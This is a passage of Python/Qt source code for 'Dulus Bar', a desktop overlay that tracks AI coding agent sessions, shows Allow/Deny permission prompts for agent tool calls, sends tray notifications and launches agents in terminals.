            self.toast_body.setText(_elide(perm.tool or "Run a tool?", 90))
            self.toast_code.setText(self._wrap_code(detail))
            self.toast_code.setVisible(True)
        else:
            self.toast_body.setText(_elide(perm.tool or "Run a tool?", 220))
            self.toast_code.setVisible(False)
        self.always_btn.setVisible(perm.can_always)
        self.always_btn.setToolTip(_esc(f"Don't ask again for {perm.always_label}") if perm.always_label else "")
        self._update_counter()
        # Size for the card's real width: adjustSize() measures at the
        # layout's preferred width and clipped long commands. Re-run both
        # layouts first, or the height is the previous card's.
        for layout in (self.toast_card.layout(), self.toast.layout()):
            if layout is not None:
                layout.invalidate()
                layout.activate()
        self.toast.setFixedHeight(max(120, self.toast.heightForWidth(TOAST_WIDTH)))
        self.toast.setVisible(True)
        self.toast.raise_()
        self.toast_visible = True
        self._position_toast()

    # Visual lines the code block shows before it says how much is left.
    CODE_MAX_LINES = 10

    def _wrap_code(self, detail: str) -> str:
        """Hard-wrap at the block's real width so nothing is cut off sideways —
        a long command is never partly hidden off the right edge."""
        import textwrap

        # card width - shadow margins - card margins - code padding/borders
        room = TOAST_WIDTH - 28 - 32 - 22
        advance = QtGui.QFontMetricsF(self.toast_code.font()).horizontalAdvance("M" * 20) / 20
        cols = max(20, int(room / max(1.0, advance)) - 1)
        visual: List[str] = []
        for line in detail.expandtabs(4).splitlines() or [""]:
            visual.extend(textwrap.wrap(line, cols, break_long_words=True, replace_whitespace=False,
                                        drop_whitespace=False) or [""])
        if len(visual) > self.CODE_MAX_LINES:
            hidden = len(visual) - (self.CODE_MAX_LINES - 1)
            visual = visual[: self.CODE_MAX_LINES - 1] + [f"… {hidden} more lines"]
        return "\n".join(visual)

    def _resolve_permission(self, approved: bool, *, always: bool = False) -> None:
        perm = self.current_permission
        if perm is None:
            return
        self.server.decide(perm.request_id, approved, always=always,
                           agent=perm.agent, session_id=perm.session_id)
        # Optimistic: the hub confirms with request_resolved, a no-op by then.
        self.store.resolve(perm.request_id, "approved" if approved else "denied")
        self.current_permission = None
        self._sync_permission_card()
        self._refresh_ui()

    def _position_toast(self) -> None:
        geo = self.geometry()
        toast_x = geo.x() + (geo.width() - self.toast.width()) // 2
        toast_y = geo.y() + self.pill.height() + 12
        if self.expanded and self.panel.isVisible():
            toast_y += self.panel.height() + 8
        self.toast.move(max(0, toast_x), toast_y)

    # --- notifications ----------------------------------------------------
    def _can_notify(self, key: Tuple[str, str]) -> bool:
        if self.tray is None or not self.settings["notifications"] or self.settings["do_not_disturb"]:
            return False
        now = time.monotonic()
        if now - self._last_notified.get(key, -NOTIFY_COOLDOWN_S) < NOTIFY_COOLDOWN_S:
            return False
        self._last_notified[key] = now
        return True

    def _notify_permission(self, perm: Permission) -> None:
        if self._can_notify(perm.key) and self.tray is not None:
            name = style_for(perm.agent).display
            self.tray.notify(f"{name} needs your approval", _elide(perm.label(), 120), warning=True)

    def _notify_finished(self, session: Session) -> None:
        if self.expanded or not self._can_notify(session.key) or self.tray is None:
            return  # you're already looking at it
        name = style_for(session.agent).display + (f" · {session.title}" if session.title else "")
        if session.status == "error":
            self.tray.notify(f"{name} hit an error", _elide(session.message, 120), warning=True)
        else:
            self.tray.notify(f"{name} is done", _elide(session.message or "Your turn", 120))

    # --- expand / collapse ----------------------------------------------
    def _panel_height(self) -> int:
        n = len(self.store.sessions)
        if n == 0:
            body = max(44, self.empty_label.sizeHint().height())
        else:
            body = n * ROW_HEIGHT + (n - 1) * 2
        # margins(12+12) + header(16) + gap(6) + body
        return 12 + 16 + 6 + body + 12

    def _apply_geometry(self) -> None:
        # Tucked: show only the slim peek tab flush with the top edge.
        if self._autohide and not self.revealed:
            self.peek.setVisible(True)
            self.pill.setVisible(False)
            self.panel.setVisible(False)
            size = (PEEK_WIDTH + 8, PEEK_HEIGHT + 6)
        else:
            # Revealed: full pill (optionally with the expanded panel).
            self.peek.setVisible(False)
            self.pill.setVisible(True)
            if self.expanded:
                ph = self._panel_height()
                self.panel.setFixedHeight(ph)
                self.panel.setVisible(True)
                # top(8) + pill(42) + gap(8) + panel + bottom shadow room(16);
                # never narrower than the pill, or the pill gets clipped.
                width = max(PANEL_WIDTH, self.pill.sizeHint().width() + 8)
                size = (width, 8 + 42 + 8 + ph + 16)
            else:
                self.panel.setVisible(False)
                size = (
                    max(self.pill.minimumWidth(), self.pill.sizeHint().width() + 8),
                    58,
                )

        # Resize only on a real change. The refresh timer runs every second, and
        # re-stating the same fixed size made the island flicker on X11 — worse,
        # every resize is a fresh invitation for the WM to re-place us.
        if size != self._size:
            self._size = size
            self.setFixedWidth(size[0])
            self.setFixedHeight(size[1])
            self._settle_position()
        self._reposition()
        self._position_toast()

    def _toggle_expand(self) -> None:
        self.expanded = not self.expanded
        if self.expanded:
            # Brief grace so a quick cursor drift doesn't collapse it instantly.
            self._expand_grace = time.monotonic() + 1.0
            self._sync_rows()
        self._apply_geometry()
        self._refresh_ui()

    # --- brand icon -----------------------------------------------------
    def _load_bird_pixmap(self, px: int) -> Optional[QtGui.QPixmap]:
        """Load the Dulus bird, crisp on HiDPI (devicePixelRatio-aware)."""
        path = Path(__file__).resolve().parent / "assets" / "dulus-bird.png"
        if not path.is_file():
            return None
        src = QtGui.QPixmap(str(path))
        if src.isNull():
            return None
        screen = QApplication.primaryScreen()
        dpr = screen.devicePixelRatio() if screen else 1.0
        pm = src.scaledToHeight(
            max(1, int(px * dpr)), Qt.TransformationMode.SmoothTransformation
        )
        pm.setDevicePixelRatio(dpr)
        return pm

    def _apply_pill_icon(self, agent: Optional[str]) -> None:
        """Brand bird for Dulus / idle; the agent's own emoji for everyone else."""
        bird = (agent is None or style_for(agent).key == "dulus") and self._bird_pixmap is not None
        key = "bird" if bird else (style_for(agent).emoji if agent else "🦅")
        if key == getattr(self, "_pill_icon_key", None):
            return  # re-setting it every second repainted the blurred pill
        self._pill_icon_key = key
        if bird:
            self.icon_label.setPixmap(self._bird_pixmap)
        else:
            self.icon_label.clear()
            self.icon_label.setText(key)

    # --- notch auto-hide (reveal on hover / activity / permission) -------
    def _style_peek(self, color: str) -> None:
        if color == getattr(self, "_peek_color", None):
            return
        self._peek_color = color
        radius = PEEK_HEIGHT // 2
        self.peek.setStyleSheet(
            f"#peek {{ background-color: {color}; border-radius: {radius}px; }}"
        )

    def _aggregate_color(self) -> str:
        statuses = {s.status for s in self.store.sessions.values()}
        for status, color in (("waiting", WARN), ("error", BAD), ("running", GOOD)):
            if status in statuses:
                return color
        return PILL_BORDER

    def _refresh_peek(self) -> None:
        """Tint the resting peek so activity is visible without revealing."""
        self._style_peek(self._aggregate_color())

    def _init_hover_timer(self) -> None:
        self._hover_timer = QTimer(self)
        self._hover_timer.timeout.connect(self._poll_cursor)
        self._hover_timer.start(120)

    def _hot_zone(self) -> QtCore.QRect:
        """Top-center strip that behaves like the macOS notch hover target."""
        rect = self._screen_rect()
        w = max(self.width(), PEEK_WIDTH) + 2 * HOT_ZONE_PAD
        x = rect.x() + (rect.width() - w) // 2
        return QtCore.QRect(x, rect.y(), w, HOT_ZONE_HEIGHT)

    def _cursor_near(self) -> bool:
        pos = QtGui.QCursor.pos()
        if self._hot_zone().contains(pos):
            return True
        # Once revealed, hovering anywhere over the island keeps it open.
        return self.revealed and self.geometry().contains(pos)

    def _poll_cursor(self) -> None:
        # Move / click away from the island collapses the expanded ACTIVE AGENTS
        # panel (dismiss-on-outside). Runs even without notch auto-hide; the
        # permission toast is deliberately left untouched (needs Allow/Deny).
        if self.expanded and not self._cursor_near():
            self._collapse_if_away()
        if not self._autohide:
            return
        near = self._cursor_near()
        now = time.monotonic()
        if near:
            if self._hover_entered_at == 0.0:
                self._hover_entered_at = now
            if (now - self._hover_entered_at) >= (HOVER_DWELL_MS / 1000.0):
                self._reveal()
        else:
            self._hover_entered_at = 0.0
            self._maybe_tuck()

    def _collapse_if_away(self) -> None:
        if not self.expanded or self.toast_visible:
            return
        if time.monotonic() < self._expand_grace:  # honour the just-expanded grace
            return
        self.expanded = False
        self._apply_geometry()

    def _reveal(self, *, brief: bool = False, pin: bool = False) -> None:
        if pin:
            self.permission_pinned = True
        if brief:
            self._reveal_until = time.monotonic() + BRIEF_REVEAL_MS / 1000.0
        if self._autohide and not self.revealed:
            self.revealed = True
            self._apply_geometry()

    def _maybe_tuck(self) -> None:
        if not self._autohide or not self.revealed:
            return
        # Never tuck while the user is engaged or a decision is pending.
        if self.expanded or self.permission_pinned or self.toast_visible:
            return
        if time.monotonic() < self._reveal_until:
            return
        if self._cursor_near():
            return
        self.revealed = False
        self._apply_geometry()

    def set_autohide(self, enabled: bool) -> None:
        self.settings.set("autohide", enabled)
        self._autohide = enabled and not self._autohide_forced_off
        self.revealed = True if not self._autohide else self.revealed
        self._apply_geometry()

    # --- render ---------------------------------------------------------
    def _refresh_ui(self) -> None:
        front = self.store.foremost()
        if front is not None:
            st = style_for(front.agent)
            self._apply_pill_icon(front.agent)
            self.pill_dot.set_status(front.status)
            self.pill_dot.setVisible(True)
            self.status_label.setText(st.display)
            self.meta_label.setText(self._pill_meta(front))
        else:
            self._apply_pill_icon(None)
            self.pill_dot.setVisible(False)
            self.status_label.setText(APP_NAME)
            self.meta_label.setText("")

        active = self.store.active()
        if active:
            self.count_badge.setText(str(len(active)))
            waiting = any(s.status == "waiting" for s in active)
            self._style_badge(WARN if waiting else GOOD)
            self.count_badge.setVisible(True)
        else:
            self.count_badge.setVisible(False)

        self._refresh_peek()
        if self.expanded:
            self._sync_rows()
        self._apply_geometry()

    def _pill_meta(self, session: Session) -> str:
        meta = _meta_html(session, style_for(session.agent).accent)
        if meta and session.status != "waiting":
            return meta
        msg = _esc(_fit(session.message or session.status, self.meta_label.font(), PILL_META_PX))
        color = WARN if session.status == "waiting" else TEXT_FAINT
        return f"<span style='color:{color};'>{msg}</span>"

    def _claude_connected(self) -> bool:
        """Cached: the empty state asks every second while it's on screen."""
        now = time.monotonic()
        cached = getattr(self, "_claude_cache", None)
        if cached is None or now - cached[0] > 5.0:
            from .integrations import claude

            cached = (now, bool(claude.status().get("installed")))
            self._claude_cache = cached
        return cached[1]

    def _empty_text(self) -> str:
        if self.server.error is not None:
            return (f"<span style='color:{BAD};'>Couldn't start the hub on port {self.server.port}.</span>"
                    "<br>Is another Dulus Bar running? Try <b>dulusbar doctor</b>.")
        if self._claude_connected():
            return "No agents yet — start Claude Code or any wrapped agent and it shows up here."
        return ("No agents yet.<br>Connect Claude Code: right-click → <b>Integrations</b>"
                ", or run <b>dulusbar hooks install</b>.")

    def _sync_rows(self) -> None:
        """Update rows in place — rebuilding them every second made them flicker."""
        ordered = self.store.ordered()
        keys = [s.key for s in ordered]
        for key in list(self._rows):
            if key not in self.store.sessions:
                row = self._rows.pop(key)
                self.sessions_container.removeWidget(row)
                row.deleteLater()
        for index, session in enumerate(ordered):
            row = self._rows.get(session.key)
            if row is None:
                row = SessionRow(session)
                row.clicked.connect(self._on_session_click)
                row.dismissed.connect(self._dismiss_session)
                self._rows[session.key] = row
            else:
                row.update_session(session)
            if self.sessions_container.indexOf(row) != index:
                self.sessions_container.insertWidget(index, row)
        self.empty_label.setVisible(not keys)
        if not keys:
            self.empty_label.setText(self._empty_text())
        self.clear_btn.setVisible(bool(self.store.finished()))

    def _dismiss_session(self, session: Session) -> None:
        self.server.remove_session(session.agent, session.session_id)
        self.store.remove_session(session.key)
        self._refresh_ui()

    def _clear_finished(self) -> None:
        self.server.clear_finished()
        for key in self.store.finished():
            self.store.remove_session(key)
        self._refresh_ui()

    def _on_session_click(self, session: Session) -> None:
        hint = session.terminal_hint
        if hint:
            w = native.find_window_by_title(hint)
            if w and native.activate_window(w.handle):
                return
        if session.pid and (not session.pid_host or session.pid_host == P.host_id()):
            if native.focus_pid(session.pid):
                return
        native.jump_to_terminal(hint)

    # --- right-click menu (shared by the island AND the tray icon) ------
    def _menu_style(self) -> str:
        return (
            f"QMenu {{ background: {BG}; color: {TEXT}; border: 1px solid {BORDER}; "
            f"border-radius: 10px; padding: 6px; font-size: 12px; }}"
            f"QMenu::item {{ padding: 6px 18px; border-radius: 6px; }}"
            f"QMenu::item:selected {{ background: {BG_HOVER}; }}"
            f"QMenu::item:disabled {{ color: {TEXT_FAINT}; }}"
            f"QMenu::separator {{ height: 1px; background: {BORDER}; margin: 6px 8px; }}"
        )

    def _build_menu(self, tray: bool = False) -> QtWidgets.QMenu:
        """The full right-click menu, built in ONE place so the island's menu and
        the tray icon's menu are always identical. They used to be two separate
        copies that drifted — the island's ended up missing entries."""
        menu = QtWidgets.QMenu()
        self._populate_menu(menu, tray=tray)
        return menu

    def _populate_menu(self, menu: QtWidgets.QMenu, tray: bool = False) -> None:
        menu.clear()
        menu.setStyleSheet(self._menu_style())

        # Only the first entry differs: the tray offers "Show island"; the island
        # (already visible) offers Collapse/Expand instead.
        if tray:
            show = menu.addAction("Show island")
            if show is not None:
                show.triggered.connect(self._show_island)
        else:
            toggle = menu.addAction("Collapse" if self.expanded else "Expand")
            if toggle is not None:
                toggle.triggered.connect(self._toggle_expand)
        menu.addSeparator()

        bundled_dulus = self._find_bundled_dulus()
        wrapper_exists = (self._wrappers_dir() / "dulus_wrapper.py").exists()
        if bundled_dulus or wrapper_exists:
            dulus_menu = menu.addMenu("🦅  Dulus")
            if dulus_menu is not None:
                dulus_menu.setStyleSheet(menu.styleSheet())
                if bundled_dulus:
                    gui_act = dulus_menu.addAction("Open Dulus GUI")
                    if gui_act is not None:
                        gui_act.triggered.connect(lambda _=False: self._open_bundled_dulus(terminal=False))
                    term_act = dulus_menu.addAction("Open Dulus Terminal")
                    if term_act is not None:
                        term_act.triggered.connect(lambda _=False: self._open_bundled_dulus(terminal=True))
                if wrapper_exists:
                    if bundled_dulus:
                        dulus_menu.addSeparator()
                    wrapper_act = dulus_menu.addAction("Open Dulus (wrapper)")
                    if wrapper_act is not None:
                        wrapper_act.triggered.connect(self._open_dulus)

        agent_menu = menu.addMenu("📂  Open agent…")
        if agent_menu is not None:
            agent_menu.setStyleSheet(menu.styleSheet())
            installed = detect_installed()
            for st, exe in installed:
                act = agent_menu.addAction(f"{st.emoji}  {st.display}")
                if act is not None:
                    act.triggered.connect(
                        lambda _=False, n=st.display, e=exe: self._launch_agent(n, [e])
                    )
            if installed:
                agent_menu.addSeparator()
            choose = agent_menu.addAction("Choose any AI or executable…")
            if choose is not None:
                choose.triggered.connect(self._open_agent_dialog)

        self._add_integrations_menu(menu)
        menu.addSeparator()

        finished = len(self.store.finished())
        clear = menu.addAction(f"Clear finished ({finished})" if finished else "Clear finished")
        if clear is not None:
            clear.setEnabled(bool(finished))
            clear.triggered.connect(self._clear_finished)

        self._add_settings_menu(menu)
        folder = menu.addAction("Open Dulus Bar folder")
        if folder is not None:
            folder.triggered.connect(self._open_project_folder)
        open_docs = menu.addAction("Open docs")
        if open_docs is not None:
            open_docs.triggered.connect(lambda: webbrowser.open(DOCS_URL))

        menu.addSeparator()
        quit_act = menu.addAction("Quit Dulus Bar")
        if quit_act is not None:
            quit_act.triggered.connect(self.quit_app)

    def quit_app(self) -> None:
        """Really quit. QApplication.quit() asks every window to close first
        and gives up when one refuses — and the island refuses (it hides
        instead), so "Quit" used to leave the app running."""
        self._quitting = True
        self.toast.hide()
        QApplication.exit(0)

    def _add_integrations_menu(self, menu: QtWidgets.QMenu) -> None:
        from .integrations import claude, codex

        sub = menu.addMenu("🔌  Integrations")
        if sub is None:
            return
        sub.setStyleSheet(menu.styleSheet())
        for label, module, hint in (
            ("Claude Code — status + Allow / Deny", claude, "Restart Claude Code sessions to pick it up."),
            ("Codex — turn-complete alerts", codex, "New Codex sessions will report to the island."),
        ):
            st = module.status()
            act = sub.addAction(label)
            if act is None:
                continue
            act.setCheckable(True)
            act.setChecked(bool(st.get("installed")))
            if st.get("error"):
                act.setEnabled(False)
                act.setToolTip(st["error"])
            act.triggered.connect(
                lambda checked, m=module, n=label.split(" — ")[0], h=hint: self._toggle_integration(m, n, h, checked)
            )

    def _toggle_integration(self, module, name: str, hint: str, enable: bool) -> None:  # noqa: ANN001
        from .integrations import ConfigError

        try:
            if enable:
                result = module.install()
                message = f"{name} connected ({result['path']}). {hint}"
            else:
                module.uninstall()
                message = f"{name} disconnected."
        except ConfigError as exc:
            QtWidgets.QMessageBox.warning(self, APP_NAME, str(exc))
            return
        self._claude_cache = None
        if self.tray is not None:
            self.tray.notify(APP_NAME, message)
        else:
            QtWidgets.QMessageBox.information(self, APP_NAME, message)
        self._refresh_ui()

    def _add_settings_menu(self, menu: QtWidgets.QMenu) -> None:
        sub = menu.addMenu("⚙  Settings")
        if sub is None:
            return
        sub.setStyleSheet(menu.styleSheet())

        def toggle(label: str, checked: bool, handler, enabled: bool = True) -> None:  # noqa: ANN001
            act = sub.addAction(label)
            if act is not None:
                act.setCheckable(True)
                act.setChecked(checked)
                act.setEnabled(enabled)
                act.triggered.connect(handler)

        toggle("Auto-hide (reveal on hover)", self._autohide, self.set_autohide,
               enabled=not self._autohide_forced_off)
        toggle("Peek open when an agent finishes", bool(self.settings["reveal_on_activity"]),
               lambda on: self.settings.set("reveal_on_activity", on))
        toggle("Notifications", bool(self.settings["notifications"]),
               lambda on: self.settings.set("notifications", on), enabled=self.tray is not None)
        toggle("Do not disturb", bool(self.settings["do_not_disturb"]),
               lambda on: self.settings.set("do_not_disturb", on))
        toggle("Start at login", autostart.is_enabled(), self._set_autostart)

    def _set_autostart(self, enabled: bool) -> None:
        try:
            autostart.enable() if enabled else autostart.disable()
        except Exception as exc:
            QtWidgets.QMessageBox.warning(self, APP_NAME, f"Couldn't change Start at login: {exc}")

    def _show_island(self) -> None:
        self.show()
        self._reveal(brief=True)

    def _show_context_menu(self) -> None:
        # Keep a ref so the menu isn't garbage-collected mid-exec.
        self._menu = self._build_menu(tray=False)
        self._menu.exec(QtGui.QCursor.pos())

    def _open_project_folder(self) -> None:
        root = str(self._repo_root())
        try:
            if sys.platform == "win32":
                os.startfile(root)  # type: ignore[attr-defined]
            elif sys.platform == "darwin":
                subprocess.Popen(["open", root])
            else:
                subprocess.Popen(["xdg-open", root])
        except Exception:
            pass

    def _repo_root(self) -> Path:
        return Path(__file__).resolve().parent.parent

    def _wrappers_dir(self) -> Path:
        """Where the agent wrappers live: packaged inside dulus_bar for pip
        installs, with a fallback to the old repo-root layout for source
        checkouts. They used to sit at the repo root and were excluded from the
        wheel, so a pip-installed island launched ``python <missing>`` and the
        terminal closed instantly."""
        packaged = Path(__file__).resolve().parent / "wrappers"
        if (packaged / "agent_wrapper.py").exists():
            return packaged
        return self._repo_root() / "wrappers"

    def _python_console(self) -> str:
        """A python with a real console (not pythonw, which has no stdin)."""
        return python_console()

    def _wrap_argv(self, display_name: str, command: List[str]) -> List[str]:
        """argv that runs ``command`` wired to the island.

        Frozen builds (Nuitka / PyInstaller) have no Python to hand a wrapper
        script to, so they re-invoke themselves: ``DulusBar wrap NAME -- …``.
        """
        from .integrations import is_frozen, self_argv

        if is_frozen():
            return self_argv("wrap", display_name, "--", *command)
        wrapper = self._wrappers_dir() / "agent_wrapper.py"
        return [self._python_console(), str(wrapper), display_name, *command]

    def _launch_agent(self, display_name: str, command: List[str]) -> None:
        argv = self._wrap_argv(display_name, command)
        ok = native.open_terminal_running(argv, title=display_name, cwd=str(Path.home()))
        if not ok:
            QtWidgets.QMessageBox.warning(
                self, "Dulus Bar",
                f"Couldn't open a terminal for {display_name}.\n"
                "Run it manually:\n  " + " ".join(argv),
            )

    def _open_dulus(self) -> None:
        root = self._repo_root()
        wrapper = self._wrappers_dir() / "dulus_wrapper.py"
        argv = [self._python_console(), str(wrapper)]
        ok = native.open_terminal_running(argv, title="Dulus", cwd=str(root))
        if not ok:
            QtWidgets.QMessageBox.warning(
                self, "Dulus Bar", "Couldn't open a terminal for Dulus.\nRun: " + " ".join(argv)
            )

    def _open_agent_dialog(self) -> None:
        dialog = QtWidgets.QFileDialog(
            self,
            "Open agent",
            str(Path.home()),
            "Agents (*.py *.exe *.sh *.js *.mjs *.ts);;All files (*)",
        )
        if sys.platform not in ("win32", "darwin"):
            # GTK/portal file choosers regularly fail or hang when driven from a
            # Qt app on Linux; Qt's own dialog always comes up.
            dialog.setOption(QtWidgets.QFileDialog.Option.DontUseNativeDialog, True)
        if not dialog.exec():
            return
        selected = dialog.selectedFiles()
        path = selected[0] if selected else ""
        if not path:
            return
        p = Path(path)
        guess = style_for(p.stem).display
        name, ok = QtWidgets.QInputDialog.getText(
            self, "Agent name", "Name shown on the bar:", text=guess
        )
        if not ok or not name.strip():
            return
        name = name.strip()
        if p.suffix.lower() == ".py":
            command = [self._python_console(), str(p)]
        elif p.suffix.lower() in (".js", ".mjs", ".ts"):
            node = shutil.which("node") or "node"
            command = [node, str(p)]
        else:
            command = [str(p)]
        self._launch_agent(name, command)

    def _find_bundled_dulus(self) -> Optional[Path]:
        """Return the path to a bundled Dulus binary/app next to or above Dulus Bar.

        Supported layouts:
          - Windows/Linux: DulusBar next to Dulus.exe / Dulus
          - macOS side-by-side: DulusBar.app next to Dulus.app
          - macOS nested: DulusBar.app inside Dulus.app/Contents/Resources
          - Dev/source: Dulus Bar repo next to the Interant repo
        """
        exe = Path(sys.executable).resolve()
        search_roots = [exe.parent]
        current = exe.parent
        for _ in range(7):
            current = current.parent
            search_roots.append(current)
        for root in search_roots:
            for p in (root / "Dulus.exe", root / "Dulus"):
                # Must be a real executable file: a *directory* called "Dulus"
                # (the Interant checkout, typically) used to match and then fail
                # to launch.
                if p.is_file():
                    return p
            for p in (
                root / "Dulus.app",
                root / "Resources" / "Dulus.app",
                root / "Contents" / "Resources" / "Dulus.app",
            ):
                if p.exists():
                    return p
        # Source-run fallback: look next to the Dulus Bar repo.
        repo = self._repo_root()
        for root in (repo.parent, repo.parent.parent):
            for name in ("Dulus.app", "Dulus.exe", "Dulus"):
                p = root / name
                if p.is_file() or (p.suffix == ".app" and p.exists()):
                    return p
        return None

    def _open_bundled_dulus(self, *, terminal: bool = False) -> None:
        path = self._find_bundled_dulus()
        if not path:
            QtWidgets.QMessageBox.warning(self, "Dulus Bar", "Bundled Dulus executable not found.")
            return
        if sys.platform not in ("win32", "darwin") and path.is_file() and not os.access(path, os.X_OK):
            QtWidgets.QMessageBox.warning(
                self, "Dulus Bar", f"{path} is not executable.\nRun:  chmod +x {path}"
            )
            return
        try:
            if sys.platform == "darwin" and path.suffix == ".app":
                if terminal:
                    binary = path / "Contents" / "MacOS" / "Dulus"
                    if binary.exists():
                        native.open_terminal_running([str(binary), "--cli"], title="Dulus", cwd=str(path.parent))
                    else:
                        QtWidgets.QMessageBox.warning(self, "Dulus Bar", f"Dulus CLI binary not found inside {path}")
                else:
                    subprocess.Popen(["open", str(path)])
            elif sys.platform == "win32":
                if terminal:
                    native.open_terminal_running([str(path), "--cli"], title="Dulus", cwd=str(path.parent))
                else:
                    subprocess.Popen([str(path)], creationflags=0x08000000)
            else:
                if terminal:
                    native.open_terminal_running([str(path), "--cli"], title="Dulus", cwd=str(path.parent))
                else:
                    subprocess.Popen([str(path)], start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as exc:
            QtWidgets.QMessageBox.warning(self, "Dulus Bar", f"Could not open Dulus: {exc}")

    def closeEvent(self, a0: Optional[QtGui.QCloseEvent]) -> None:
        if self._quitting:
            if a0 is not None:
                a0.accept()
            return
        if a0 is not None:
            a0.ignore()
        self.hide()


class TrayApp:
    """System-tray icon + overlay launcher."""

    def __init__(self, app: QApplication, overlay: DulusBarOverlay):
        self.app = app
        self.overlay = overlay
        self.tray: Optional[QtWidgets.QSystemTrayIcon] = None
        self._icon = QIcon()

    def build(self) -> None:
        brand_icon = Path(__file__).resolve().parent / "assets" / "dulus-bird.png"
        icon = QIcon(str(brand_icon)) if brand_icon.is_file() else QIcon()
        if icon.isNull():
            icon = QIcon.fromTheme("utilities-terminal")
        if icon.isNull():
            pixmap = QtGui.QPixmap(64, 64)
            pixmap.fill(QColor(BG))
            icon = QIcon(pixmap)
        self._icon = icon
        self.app.setWindowIcon(icon)

        if not QtWidgets.QSystemTrayIcon.isSystemTrayAvailable():
            # Common on stock GNOME and bare window managers. The island stays
            # visible in that case (see DulusBarOverlay.__init__) and its own
            # right-click menu is identical to the tray menu.
            print(
                "[dulusbar] no system tray on this desktop — right-click the island for the menu "
                "(GNOME users: install the AppIndicator extension for a tray icon)."
            )
            return

        self.tray = QtWidgets.QSystemTrayIcon(self.app)
        self.tray.setIcon(icon)
        self.tray.setToolTip(APP_NAME)
        self.tray.activated.connect(self._on_tray_click)

        ov = self.overlay
        # ONE menu definition, shared with the island's right-click
        # (DulusBarOverlay._populate_menu), refreshed every time it opens so
        # checkmarks and detected agents are never stale.
        self._tray_menu = ov._build_menu(tray=True)
        self._tray_menu.aboutToShow.connect(lambda: ov._populate_menu(self._tray_menu, tray=True))
        self.tray.setContextMenu(self._tray_menu)
        self.tray.show()
        ov.tray = self

    def notify(self, title: str, body: str, warning: bool = False) -> None:
        if self.tray is None or not self.tray.supportsMessages():
            return
        kind = (QtWidgets.QSystemTrayIcon.MessageIcon.Warning if warning
                else QtWidgets.QSystemTrayIcon.MessageIcon.Information)
        self.tray.showMessage(title, body, kind, 5000)

    def _on_tray_click(self, reason: QtWidgets.QSystemTrayIcon.ActivationReason) -> None:
        if reason in (QtWidgets.QSystemTrayIcon.ActivationReason.DoubleClick,
                      QtWidgets.QSystemTrayIcon.ActivationReason.Trigger):
            self.overlay._show_island()


def run_overlay() -> int:
    global FONT_FAMILY, MONO_FAMILY

    # Must happen before the QApplication exists: on Wayland this switches us to
    # XWayland, the only way a client can pin itself to the top of the screen.
    native.prepare_environment()

    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)
    app.setApplicationName(APP_NAME)
    # Lets Linux desktops match the window/tray to our .desktop entry & icon.
    app.setDesktopFileName("dulusbar")

    FONT_FAMILY = native.default_font_family()
    MONO_FAMILY = QtGui.QFontDatabase.systemFont(QtGui.QFontDatabase.SystemFont.FixedFont).family()
    app.setFont(QFont(FONT_FAMILY, 10))

    server = AgentEventServer(port=P.configured_port(), publish=True)
    # Subscribe before the hub starts so not a single event is missed.
    overlay = DulusBarOverlay(server)
    server.start()
    overlay.show()

    tray = TrayApp(app, overlay)
    tray.build()

    code = app.exec()
    server.stop()
    return code


if __name__ == "__main__":
    sys.exit(run_overlay())
